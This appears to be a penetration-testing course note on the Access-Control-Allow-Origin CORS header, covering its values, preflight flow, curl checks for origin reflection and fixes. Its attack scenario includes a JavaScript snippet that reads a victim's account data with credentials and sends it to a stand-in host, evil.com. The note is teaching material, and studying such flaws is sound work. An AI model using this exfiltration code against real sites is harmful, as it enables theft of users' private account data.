---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.41 Access-Control-Allow-Origin — CORS"
portswigger_labs: ["CORS — 4 labs"]
---

# 03.41 — Access-Control-Allow-Origin (ACAO)

## What is it?

`Access-Control-Allow-Origin` is the primary CORS response header. It tells the browser which origins are allowed to read the response. Combined with `Access-Control-Allow-Credentials`, its misconfiguration can allow cross-origin reading of sensitive data.

---

## Values

```
Access-Control-Allow-Origin: *
  → Any origin can read response
  → Cannot be combined with Access-Control-Allow-Credentials: true
  → Safe for public APIs, NOT for authenticated endpoints

Access-Control-Allow-Origin: https://trusted.com
  → Only this origin can read response
  → Can be combined with credentials (if intended)

Access-Control-Allow-Origin: null
  → Only null origin can read (sandboxed iframes, data: URIs)
  → DANGEROUS: any sandboxed iframe can read response!
  
[No ACAO header]
  → No cross-origin reads allowed (default SOP behavior)
```

---

## Critical: Wildcard + Credentials

```
BROWSER RULE:
  If response has:
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Credentials: true
  
  → Browser REFUSES to expose response!
  
  (RFC says you can't have wildcard AND credentials = true)
  
SO: A * policy is safe IF AND ONLY IF credentials are not included.
    If an app reflects Origin dynamically AND sets credentials: true → CRITICAL!
```

---

## Attack Scenario: Dynamic Origin Reflection

```
App reflects any Origin:
  Request:  Origin: https://evil.com
  Response: Access-Control-Allow-Origin: https://evil.com
            Access-Control-Allow-Credentials: true

EXPLOIT:
  // attacker's page at evil.com
  fetch('https://target.com/api/account', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal?d='+JSON.stringify(data)))
  
  → Browser: "ACAO allows evil.com, credentials=true, so I'll include cookies"
  → Backend: Victim's cookies → returns account data!
  → Attacker reads victim's account!
```

**PortSwigger Labs:** CORS (4 labs)

---

## CORS Header Flow

```
PREFLIGHT (for non-simple requests):
  OPTIONS /api/data HTTP/1.1
  Origin: https://evil.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Authorization

  RESPONSE:
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Methods: GET, POST
  Access-Control-Allow-Headers: Authorization
  Access-Control-Max-Age: 86400

ACTUAL REQUEST:
  POST /api/data HTTP/1.1
  Origin: https://evil.com
  Authorization: Bearer xxx
  
  RESPONSE:
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
  [sensitive data]
```

---

## Testing CORS

```bash
# Test if Origin is reflected:
curl -sI https://target.com/api/user \
  -H "Origin: https://evil.com" | grep -i "access-control-allow-origin"

# Test null origin:
curl -sI https://target.com/api/user \
  -H "Origin: null" | grep -i "access-control"

# Test subdomain bypass:
curl -sI https://target.com/api/user \
  -H "Origin: https://evil-target.com" | grep -i "acao"

# Test ACAO + credentials:
curl -sI https://target.com/api/user \
  -H "Origin: https://evil.com" | grep -i "allow-credentials"
# If both reflect + allow-credentials=true → CRITICAL!

# Automated tool:
# Corsy: python3 corsy.py -u https://target.com/api
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Reflecting Origin dynamically | Validate against an allowlist of trusted origins |
| Wildcard ACAO + credentials | Never combine * with credentials: true |
| Null origin trusted | Treat null as untrusted |
| Prefix/suffix matching | Use exact match comparison only |

---

## Related Notes
- [[42 - Access-Control-Allow-Credentials]] — credential CORS risk
- [[16 - Origin]] — the Origin request header
- [[02.28 - Same-Origin Policy]] — SOP that CORS relaxes
- [[Module 08 - CORS]] — full CORS exploitation guide
